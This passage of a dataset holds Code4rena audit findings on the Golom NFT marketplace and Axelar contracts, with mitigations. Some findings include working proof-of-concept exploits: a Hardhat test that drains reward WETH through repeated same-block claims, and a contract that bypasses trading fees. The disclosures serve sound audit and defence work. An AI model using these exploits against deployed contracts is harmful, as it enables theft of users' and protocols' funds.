fee;     return; } ```"}, {"title": "GolomTrader's _settleBalances double counts protocol fee, reducing taker's payout for a NFT sold", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/240", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "old-submission-method", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L400   # Vulnerability details  Currently `(o.totalAmt * 50) / 10000)` protocol fee share is multiplied by `amount` twice when being accounted for as a deduction from the total in amount due to the `msg.sender` taker calculations in _settleBalances(), which is called by fillBid() and fillCriteriaBid() to handle the payouts.  Setting the severity to be high as reduced payouts is a fund loss impact for taker, which receives less than it's due whenever `amount > 1`.  Notice that the amount lost to the taker is left on the contract balance and currently is subject to other vulnerabilities, i.e. can be easily stolen by an attacker that knowns these specifics and tracks contract state. When these issues be fixed this amount to be permanently frozen on the GolomTrader's balance as it's unaccounted for in all subsequent calculations (i.e. all the transfers are done with regard to the accounts recorded, this extra sum is unaccounted, there is no general native funds rescue function, so when all other mechanics be fixed the impact will be permanent freeze of the part of taker's funds).  ## Proof of Concept  _settleBalances() uses `(o.totalAmt - protocolfee - ...) * amount`, which is `o.totalAmt * amount - ((o.totalAmt * 50) / 10000) * amount * amount - ...`, counting protocol fee extra `amount - 1` times:  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L389-L399  ```solidity             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *                     amount -                     p.paymentAmt,                 msg.sender             );         } else {             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,                 msg.sender             ); ```  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L400  ```solidity     function _settleBalances(         Order calldata o,         uint256 amount,         address referrer,         Payment calldata p     ) internal {         uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount;         WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);         WETH.withdraw(o.totalAmt * amount);         payEther(protocolfee, address(distributor));         payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);         payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);         if (o.refererrAmt > 0 && referrer != address(0)) {             payEther(o.refererrAmt * amount, referrer);             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *                     amount -                     p.paymentAmt,                 msg.sender             );         } else {             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,                 msg.sender             );         } ```  Say, if `amount = 6`, while `((o.totalAmt * 50) / 10000) = 1 ETH`, `6 ETH` is total `protocolfee` and needs to be removed from `o.totalAmt * 6` to calculate taker's part, while `1 ETH * 6 * 6 = 36 ETH` is actually removed in the calculation, i.e. `36 - 6 = 30 ETH` of taker's funds will be frozen on the contract balance.  ## Recommended Mitigation Steps  Consider accounting for `amount` once, for example:  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L403  ```solidity     function _settleBalances(         Order calldata o,         uint256 amount,         address referrer,         Payment calldata p     ) internal { -       uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount; +       uint256 protocolfee = ((o.totalAmt * 50) / 10000);         WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);         WETH.withdraw(o.totalAmt * amount); -       payEther(protocolfee, address(distributor)); +       payEther(protocolfee * amount, address(distributor));         payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);         payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);         if (o.refererrAmt > 0 && referrer != address(0)) {             payEther(o.refererrAmt * amount, referrer);             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *                     amount -                     p.paymentAmt,                 msg.sender             );         } else {             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,                 msg.sender             );         }         payEther(p.paymentAmt, p.paymentAddress); -       distributor.addFee([msg.sender, o.exchange.paymentAddress], protocolfee); +       distributor.addFee([msg.sender, o.exchange.paymentAddress], protocolfee * amount);     } ```  "}, {"title": "GolomToken.sol doesn't contain a function to mint treasury tokens", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/205", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L14-L73   # Vulnerability details  ## Impact Potential downtime in GolomTrader  ## Proof of Concept GolomToken.sol doesn't have a function to mint the treasury tokens as specified in the docs (https://docs.golom.io/tokenomics-and-airdrop). In order for these tokens to be minted, the minter would have to be changed via setMinter() and executeSetMinter() to a contract that can mint the treasury tokens. Because of the 24 hour timelock, this would lead to downtime for GolomTrader.sol if trading has already begun. This is because GolomTrader.sol calls RewardDistributor.sol#addFees each time there is a filled order. When the epoch changes, RewardDistributor.sol will try to call the mint function in GolomToken.sol. Because of the timelock, there will be at least a 24 hours period where RewardDistributor.sol is not the minter and doesn't have the permission to mint. This means that during that period all trades will revert.  ## Tools Used  ## Recommended Mitigation Steps Add a function to GolomToken.sol to mint the treasury tokens similar to the mintAirdrop() and mintGenesisReward() functions."}, {"title": "Old delegatee not deleted when delegating to new tokenId", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/169", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/8f198624b97addbbe9602a451c908ea51bd3357c/contracts/vote-escrow/VoteEscrowDelegation.sol#L80   # Vulnerability details  ## Impact In `delegate`, when a user delegates to a new tokenId, the tokenId is not removed from the current delegatee. Therefore, one user can easily multiply his voting power, which makes the toking useless for voting / governance decisions.  ## Proof Of Concept Bob owns the token with ID 1 with a current balance of 1000. He also owns tokens 2, 3, 4, 5. Therefore, he calls `delegate(1, 2)`, `delegate(1, 3)`, `delegate(1, 4)`, `delegate(1, 5)`. Now, if there is a governance decision and `getVotes` is called, Bobs balance of 1000 is included in token 2, 3, 4, and 5. Therefore, he quadrupled the voting power of token 1.  ## Recommended Mitigation Steps Remove the entry in `delegatedTokenIds` of the old delegatee or simply call `removeDelegation` first.  "}, {"title": "Repeated calls to `multiStakerClaim` in the same block leads to loss of funds", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/139", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L172-L210 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185   # Vulnerability details  ## Impact A malicious user can repeatedly claim the same staker reward for an epoch, provided the transactions all happen in the same block. This can effectively be done using services like [Flashbots bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#can-you-give-a-step-by-step-description-of-how-flashbots-works-for-a-searcher-today) and will result in the draining of the WETH balance of the `RewardDistributor` contract.  The idea is to bypass the require statement [line 185](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185) which checks if a claim has been already done for the epoch, **for a specific token ID**. By moving the locked tokens in a new lock, a new token ID will be generated and can be used to claim the rewards again, **if the transaction happens in the same block for which the epoch is updated**.  Indeed, when `multiStakerClaim()` is called, the `rewardETH` will be calculated from the amount of tokens locked in `tokenids[tindex]` at the block that triggered the epoch change (variable `epochBeginTime`). If, during this time, an attacker transfers its staked tokens to a new vault using the [`merge`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893) function of the VE token, the function will calculate the amount of staked tokens for the newly created tokenID **as the same as the original tokenID reward**.  A example abuse will look like this (pseudo-code adapted from the PoC) : ```javascript lockID = voteEscrow.create_lock(amount, 1 week); // Create lock #1 before // IN THE BLOCK OF EPOCH CHANGE rewardDistributor.multiStakerClaim([lockId], [0]); // Claim epoch 0 rewards for lock #1 voteEscrow.create_lock(1, 1 week); // Create lock #2 (requires 1 Golom token, could be created in advance) voteEscrow.merge(lockId, lockId + 1); // Transfer lock #1 tokens to lock #2 rewardDistributor.multiStakerClaim([lockId + 1], [0]); // Claim same epoch rewards for lock #2 // repeat ... ```  To abuse this, the attacker needs to follow this steps: - Have some locked Golom tokens. - Wait for a `addFee` call that will trigger an epoch change (this can be monitored by looking at the mempool or predicted from block timestamps). Services like Flashbots also [allows for specifying a range of blocks for bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#how-do-i-target-a-timestamp-range-instead-of-a-block-number-when-submitting-a-bundle) for better targeting. - Send a bundle of transactions to be included with the block containing the epoch changing transaction (see the PoC for an example of transactions).  Note that this needs to succeed only once to allow an attacker to drain all WETH funds so if the bundle isn't included for a particular epoch, given the frequency of epoch changes, the bundle will eventually be included and trigger the exploit.  ## Proof of Concept Hardhat config for disabling auto-mine and control transactions included in blocks: ```json hardhat: {     allowUnlimitedContractSize: true,     gas: 12000000,     blockGasLimit: 0x1fffffffffffff,     mining: {       auto: false,       interval: 10     } }, ``` Hardhat test (requires setting up VoteEscrow): ```javascript it('[#2] Repeated calls to `multiStakerClaim` in the same block leads to loss of funds', async () => {     async function advance_time(time_s:any){         let timestamp = await getTimestamp();         await ethers.provider.send('evm_mine', [timestamp + time_s]);     }      async function mine(){         await ethers.provider.send('evm_mine', []);     }      async function send_order(){         await testErc721.mint(await maker.getAddress());          let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges         let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut         let totalAmt = ethers.utils.parseEther('10');         let tokenId = await testErc721.current();          const order = {             collection: testErc721.address,             tokenId: tokenId,             signer: await maker.getAddress(),             orderType: 0,             totalAmt: totalAmt,             exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },             prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },             isERC721: true,             tokenAmt: 1,             refererrAmt: 0,             root: '0x0000000000000000000000000000000000000000000000000000000000000000',             reservedAddress: constants.AddressZero,             nonce: 0,             deadline: Date.now() + 100000000,             r: '',             s: '',             v: 0,         };          let signature = (await maker._signTypedData(domain, types, order)).substring(2);          order.r = '0x' + signature.substring(0, 64);         order.s = '0x' + signature.substring(64, 128);         order.v = parseInt(signature.substring(128, 130), 16);          return golomTrader.connect(prepay).fillAsk(             order,              1,              constants.AddressZero,              {paymentAmt: prePaymentAmt, paymentAddress: await governance.getAddress()},              constants.AddressZero,              {value: utils.parseEther('10.25')}         );     }      async function showPendingBlock(){         console.log('[PENDING]\\n', await ethers.provider.send(\"eth_getBlockByNumber\", [\"pending\", false]));     }      // Get some Golom tokens to taker, could come from anywhere     await golomToken.connect(governance).mintAirdrop(await taker.getAddress());     // Approve spending from VE     await golomToken.connect(taker).approve(voteEscrow.address, constants.MaxUint256);      // Simulate more fees by putting some ETH in contract before epoch 0     await maker.sendTransaction({to: rewardDistributor.address, value: utils.parseEther('100')});      // Taker starts with 10_000 ETH, hardhat account     let takerStartBalance = await ethers.provider.getBalance(taker.address);     // Send order for first epoch to get some fees in 'epochTotalFee'     await send_order();     await mine();     advance_time(1659211200 + 24*60*60 + 1); // Fast forward to epoch 1          // Setup some users who locks their tokens in VE beforehand     let lockId = 0;     for (let i = 0; i < 5; ++i){         let user = accounts[6+i];         await golomToken.connect(taker).transfer(await user.getAddress(), utils.parseEther('1'));         await golomToken.connect(user).approve(voteEscrow.address, constants.MaxUint256);         await voteEscrow.connect(user).create_lock(utils.parseEther('1'), 7*24*60*60, {gasLimit: 100000000});         lockId += 1;     }      // Create lock for taker with 1 ETH equivalent in Golom tokens (could work with only 1 'Wei' token although it will require lots of transactions)     await voteEscrow.connect(taker).create_lock(utils.parseEther('1'), 24*60*60*7, {gasLimit: 100000000});     lockId += 1;     await send_order(); // Trigger epoch change      // --- IN THE SAME BLOCK ---     await rewardDistributor.multiStakerClaim([lockId], [0]); // Claim epoch rewards for lock #1     await voteEscrow.connect(taker).create_lock(1, 24*60*60*7, {gasLimit: 100000000}); // Create lock #2 (requires 1 Golom token)     await voteEscrow.connect(taker).merge(lockId, lockId + 1, {gasLimit: 100000000}); // Merge lock #1 tokens to lock #2     await rewardDistributor.multiStakerClaim([lockId + 1], [0]); // Claim same epoch rewards for lock #2     // ... Repeat as much as you want ;)     // --- IN THE SAME BLOCK ---     await mine();      console.log('Taker WETH balance:', utils.formatEther(await weth.balanceOf(taker.address)));     await weth.connect(taker).withdraw(await weth.balanceOf(taker.address)); // Could be the last transaction in the block too     await mine();      // Taker balance difference is +++ at the end      let takerEndBalance = (await ethers.provider.getBalance(taker.address)).sub(takerStartBalance);     console.log('Taker ETH balance:', utils.formatEther(await ethers.provider.getBalance(taker.address)), '/ end:', utils.formatEther(takerEndBalance)); }); ``` Sample output: ```console RewardDistributor.sol                                                                                                                                                   Exploits                                                                                                                                                          [SOL] 27 0 50000000000000000 // First addFee call for adding fees  [SOL] 38 0 50000000000000000 // Second addFee triggering epoch change [WETH] Deposit 100100000000000000000 // Epoch 0 WETH deposit [SOL_EPOCH] 1 599999983058823529411764 16941175992249134 50000000000000000 // epoch, tokenToEmit, stakerReward, previousEpochFee 16941175992249134 401999977298823849898962 197999988818823687263667 38 // rewardStaker[epoch], rewardTrader[epoch], rewardExchange[epoch], epochBeginTime[epoch]  0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance before: 0 // WETH balance of taker [CLAIM] 6 38 911822995832895 // First multiStakerClaim, (tokenID, epochBeginTime, balanceOfAtNFT) [WETH] Sent 16683333333333333333 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance after: 16683333333333333333 // WETH balance of taker  0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance before: 16683333333333333333 // WETH balance of taker [CLAIM] 7 38 911822995832895 // Second multiStakerClaim, (tokenID, epochBeginTime, balanceOfAtNFT) [WETH] Sent 16683333333333333333 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance after: 33366666666666666666 // WETH balance of taker  Taker WETH balance: 33.366666666666666666 // After block is mined Taker ETH balance: 10033.36524137856006494 / end: 33.365289929424174404 // Profit !!       \u221a [#2] Repeated calls to `multiStakerClaim` in the same block leads to loss of funds ``` ## Recommended Mitigation Steps I initially thought about a few possible solutions: - Checking a lock creation time to prevent claiming from locks created in the same block **but the attacker can just create the blocks beforehand.** - Tracking the `msg.sender` or `tx.origin` for preventing multiple calls to `multiStakerClaim` in the same block **but the attacker can just send transactions from different addresses.** - Preventing the merging of locks **but the attacker can just create locks in advance and withdraw/add funds continuously between old/new locks.**   None really fixes the vulnerability as it comes from the feature of **locks being tradable** meaning it's not practically feasable to know if a lock has already be claimed by an individual **just by looking at the lock ID**.  A possible solution would be to find a way to prevent multiple calls to the same function within a block or better, make a checkpoint of the locks balances for each `epochBeginTime` and uses these values for calculating the rewards (instead of querying the VE contract in the loop).  "}, {"title": "Rewards owed burned NFT in RewardDistributor.sol become irretrievable", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/86", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "edited-by-warden", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L172-L210   # Vulnerability details  ## Impact Rewards owed burned NFT are permanently locked  ## Proof of Concept     function _burn(uint256 _tokenId) internal {         require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');          address owner = ownerOf(_tokenId);          // Clear approval         approve(address(0), _tokenId);         // Remove token         _removeTokenFrom(msg.sender, _tokenId);         emit Transfer(owner, address(0), _tokenId);     }      function _removeTokenFrom(address _from, uint256 _tokenId) internal {         // Throws if `_from` is not the current owner         assert(idToOwner[_tokenId] == _from);         // Change the owner         idToOwner[_tokenId] = address(0);         // Update owner token index tracking         _removeTokenFromOwnerList(_from, _tokenId);         // Change count tracking         ownerToNFTokenCount[_from] -= 1;     }  After an NFT is burned, owner of token is set to address(0).          rewardToken.transfer(tokenowner, reward);  This causes issues in multiStakerClaim L208. GOLOM uses OZ's implementation of ERC20 which doesn't allow tokens to be sent to address(0). Because the \"owner\" of the burned NFT is address(0) multiStakerClaim will always revert when called for a burned NFT trapping rewards in contract forever.  ## Tools Used  ## Recommended Mitigation Steps Implement a clawback clause inside the multiStakerClaim function. If the token is burned (i.e. owned by address(0)) the rewards should be transferred to different address. These rewards could be claimed to the treasury or burned, etc.           if (tokenowner == address(0){             rewardToken.transfer(treasury, reward);             weth.transfer(treasury, rewardEth);         }  "}, {"title": "Upon changing of delegate, VoteDelegation updates both the previous and the current checkpoint ", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/81", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L79 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L213   # Vulnerability details  The contract is accidently editing both the previous and current checkpoint when changing/removing a delegate.  ## Impact Incorrect counting of votes.  ## Proof of Concept If in `delegate` the delegate already has checkpoints, the function will grab the latest checkpoint, and add the `tokenId` to it. Note that it changes the storage variable. ```solidity         if (nCheckpoints > 0) {             Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];             checkpoint.delegatedTokenIds.push(tokenId);             _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds); ``` It then calls `_writeCheckpoint`, which [will add](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L106) a new checkpoint if there's no checkpoint created for this block yet: ```solidity         Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];          if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {             oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;         } else {             checkpoints[toTokenId][nCheckpoints] = Checkpoint(block.number, _delegatedTokenIds);             numCheckpoints[toTokenId] = nCheckpoints + 1;         } ``` Therefore, if this function has created a new checkpoint with the passed `_delegatedTokenIds`, we already saw that the previous function has already added `tokenId` to the previous checkpoint, so now both the new checkpoint and the previous checkpoint will have `tokenId` in them. This is wrong as it updates an earlier checkpoint with the latest change.  The same situation happens in [`removeDelegation`](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L213).  ## Recommended Mitigation Steps When reading the latest checkpoint: ```solidity Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1]; ``` Change the `storage` to `memory`. This way it will not affect the previous checkpoint, but will pass the correct updated array to `_writeCheckpoint`, which will then write/update the correct checkpoint.  "}, {"title": "`fillAsk()` Allows for `msg.value` to be larger than require locking the excess in the contract", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/75", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "old-submission-method", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L217   # Vulnerability details  ## Impact  It is possible to send a higher `msg.value` than is required to `fillAsk()`. The excess value that is sent will be permanently locked in the contract.  ## Proof of Concept  There is only one check over `msg.value` and it is that it's greater than `o.totalAmt * amount + p.paymentAmt`. As seen in the following code snippet from #217. ```solidity         require(msg.value >= o.totalAmt * amount + p.paymentAmt, 'mgmtm'); ```  The issue here is that the contract will only ever spend exactly `o.totalAmt * amount + p.paymentAmt`. Hence if `msg.value` is greater than this then the excess value will be permanently locked in the contract.  ## Recommended Mitigation Steps  To avoid this issue consider enforcing a strict equality.   ```solidity         require(msg.value == o.totalAmt * amount + p.paymentAmt, 'mgmtm'); ```  "}, {"title": "Delegated NFTs that are withdrawn while still delegated will remain delegated even after burn", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/59", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "edited-by-warden", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236   # Vulnerability details  ## Impact Burn NFTs remained delegated causing bloat and wasting gas  ## Proof of Concept VoteEscrowDelegation.sol doesn't change the withdraw or _burn functions inherited from VoteEscrowCore.sol. These functions are ignorant of the delegation system and don't properly remove the delegation when burning an NFT. The votes for the burned NFT will be removed but the reference will still be stored in the delegation list where it was last delegated. This creates a few issues. 1) It adds bloat to both getVotes and getPriorVotes because it adds a useless element that must be looped through. 2) The max number of users that can delegate to another NFT is 500 and the burned NFT takes up one of those spots reducing the number of real users that can delegate. 3) Adds gas cost when calling removeDelegation which adds gas cost to _transferFrom because removeElement has to cycle through a larger number of elements.  ## Tools Used  ## Recommended Mitigation Steps Override _burn in VoteEscrowDelegation and add this.removeDelegation(_tokenId), similar to how it was done in _transferFrom  "}, {"title": " Users can avoid paying fees while trading trustlessly & using golom's network effects", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/33", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L203-L271   # Vulnerability details  ## Impact - Users can avoid paying fees while trading trustlessly & using golom's network effects ## Description - If a maker makes below mentioned `AvoidsFeesContract` a [reservedAddress](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L220) and hides the info about how much they want their NFT in [order.root](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L58), they can avoid paying fees while trading trustlessly and using the nework effects of golom maketplace with 0 [o.totalAmt](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L52). see POC to get a better idea. - Here the maker uses order.root to hide the amount they want to get paid because it is much cleaner for a POC.     - but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.      - Reason they would use deadline is because that is something they can control in the golom NFT frontend      - They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check in the contract would look a different ## Proof of Concept - clone the [repo](https://github.com/code-423n4/2022-07-golom) and run `yarn` - create a `AvoidsFeesContract.sol` contract in `contracts/test/` folder with following code ``` //contract that avoids paying fees everytime  pragma solidity 0.8.11;  import \"../core/GolomTrader.sol\";  //A maker will be gurranteed a payout if it makes this contract the reservedAddress and hide the payment info about how much they want in Oder.root //Users will use this every time to trade to avoid paying fees //They use the networking effects of the golom marketplace without paying the fees contract AvoidsFeesContract {     GolomTrader public immutable golomTrader;      constructor(GolomTrader _golomTrader) {         golomTrader = _golomTrader;     }      function fillAsk(         GolomTrader.Order calldata o,         uint256 amount,         address referrer,         GolomTrader.Payment calldata p,         address receiver     ) public payable {         require(             o.reservedAddress == address(this),             \"not allowed if signer has not reserved this contract\"         ); //the signer will only allow this contract to execute the trade and since it has following checks, they will be guranteed a payout they want without paying the fees         require(             p.paymentAddress == o.signer,             \"signer needs to be the payment address\"         );         //I am using root as an example because it is much cleaner for a POC.         //but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.         //Reason they would use deadline is because that is something they can control in the golom NFT frontend         //They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check below would look a little different         require(             p.paymentAmt == uint256(o.root),             \"you need to pay what signer wants\"         ); //the maker will hide the payment info in oder.root          golomTrader.fillAsk{value: msg.value}(             o,             amount,             referrer,             p,             receiver = msg.sender         );     } }  ``` - add following test in `test/GolomTrader.specs.ts` [here](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L390). - Also, add `const AvoidsFeesContractArtifacts = ethers.getContractFactory('AvoidsFeesContract');` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L14) line and `import { AvoidsFeesContract as AvoidsFeesContractTypes } from '../typechain/AvoidsFeesContract';` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L28) line. - run `npx hardhat compile && npx hardhat test` ```        it.only('should allow malicious contract to execute the trade while bypassing the fees', async () => {             //deploy the malicious contract             const avoidsFeesContract: AvoidsFeesContractTypes = (await (await AvoidsFeesContractArtifacts).deploy(golomTrader.address)) as AvoidsFeesContractTypes;              //here the frontend calculates exchangeAmount and prePaymentAmt as a percentage of how much the make wants to receive for their NFT.              //as far as the frontend is concerned, the maker inputs 0 for their NFT value which in turn makes the exchangeAmount and prePaymentAmt 0              let exchangeAmount = ethers.utils.parseEther('0'); // nothing to the exchange             let prePaymentAmt = ethers.utils.parseEther('0'); // no royalty cut             let totalAmt = ethers.utils.parseEther('0');             let tokenId = await testErc721.current();              let nftValueThatMakerWants = ethers.utils.parseEther('10.25');              const order = {                 collection: testErc721.address,                 tokenId: tokenId,                 signer: await maker.getAddress(),                 orderType: 0,                 totalAmt: totalAmt,                 exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },                 prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },                 isERC721: true,                 tokenAmt: 1,                 refererrAmt: 0,                 root: ethers.utils.hexZeroPad(nftValueThatMakerWants.toHexString(), 32), //convert Bignumber to bytes32                 reservedAddress: avoidsFeesContract.address,                 nonce: 0,                 deadline: Date.now() + 100000,                 r: '',                 s: '',                 v: 0,             };              let signature = (await maker._signTypedData(domain, types, order)).substring(2); //a valid signature as far as your frontend goes              order.r = '0x' + signature.substring(0, 64);             order.s = '0x' + signature.substring(64, 128);             order.v = parseInt(signature.substring(128, 130), 16);              let makerBalanceBefore = await ethers.provider.getBalance(await maker.getAddress());              await avoidsFeesContract.connect(taker).fillAsk(                 order,                 1,                 '0x0000000000000000000000000000000000000000',                 {                     paymentAmt: nftValueThatMakerWants,                     paymentAddress: order.signer,                 },                 receiver,                 {                     value: nftValueThatMakerWants,                 }             );              let makerBalanceAfter = await ethers.provider.getBalance(await maker.getAddress());              expect(await testErc721.balanceOf(await taker.getAddress())).to.be.equals('1');             expect(makerBalanceAfter.sub(makerBalanceBefore)).to.be.equals(nftValueThatMakerWants);//maker is guaranteed a payout          });  ```  ## Tools Used - the [repo](https://github.com/code-423n4/2022-07-golom) itself. (hardhat)  ## Recommended Mitigation Steps - make sure that o.totalAmt is greater than p.paymentAmt in addition to [this](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L217) check  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "## [NAZ-L1] `receive()` Function Should Emit An Event **Severity**: Low **Context**: [`DepositReceiver.sol#L29`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositReceiver.sol#L29), [`AxelarDepositServiceProxy.sol#L13`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositServiceProxy.sol#L13)  **Description**: Consider emitting an event inside this function with `msg.sender` and `msg.value` as the parameters. This would make it easier to track incoming ether transfers.  **Recommendation**: Add events to the `receive()` functions.    ## [NAZ-L2] Local Variable Shadowing **Severity**: Low **Context**: [`AxelarDepositService.sol#L19 (both gateway && wrappedSymbol)`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L19)  **Description**: These Variables shadow state variables. As a result, the use of them locally might be incorrect.  **Recommendation**: Rename the local variables that shadow another component.   ## [NAZ-N1] Code Contains Empty Blocks **Severity** Informational **Context**: [`AxelarDepositServiceProxy.sol#L13`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositServiceProxy.sol#L13), [`AxelarAuthWeighted.sol#L101`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L101)  **Description**: It's best practice that when there is an empty block, to add a comment in the block exmplaining why it's empty.  **Recommendation**: Consider adding `/* Comment on why */` to the empty block.   ## [NAZ-N2] Variable Naming Convention **Severity** Informational **Context**: [`AxelarGateway.sol#L45-L46`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L45-L46)  **Description**: The linked variables do not conform to the standard naming convention of Solidity whereby functions and variable names(local, state and immutable) utilize the `mixedCase` format unless variables are declared as `constant` in which case they utilize the `UPPER_CASE_WITH_UNDERSCORES` format. 